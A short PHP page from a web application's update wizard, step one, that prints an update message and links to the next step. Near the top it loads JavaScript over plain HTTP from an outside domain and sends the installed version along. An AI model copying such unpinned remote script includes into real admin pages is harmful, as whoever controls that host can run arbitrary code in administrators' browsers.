 <?php

 include_once '../dbconfig.php';
 include "update.php";
 include "header.php";
    ?>
    <script language="javascript" src="http://apikariya.gq/myads.php?name=_update_(<?php echo $version; ?>)"></script>
    <div class="main-content">
		<div class="form">
			<div class="sap_tabs">
				<div id="horizontalTab" style="display: block; width: 100%; margin: 0px;">
                        <div class="facts">
					        <div class="register">
						         <form>
                                 <p><?php echo $echoup; ?></p>
							        <div class="sign-up">
								        <a href="update3.php" type="next" />next</a>
							        </div>
                                </form>
						    </div>
				        </div>
                </div>
		    </div>
        </div>
        <div class="right">
			<h4>Update 1</h4>
			<ul>
				<li><p>Install the tables in the database </p></li>
				<li><p>Click on the next button</p></li>
            </ul>
        </div>
		<div class="clear"></div>
	</div>
<?php  include "footer.php";   ?>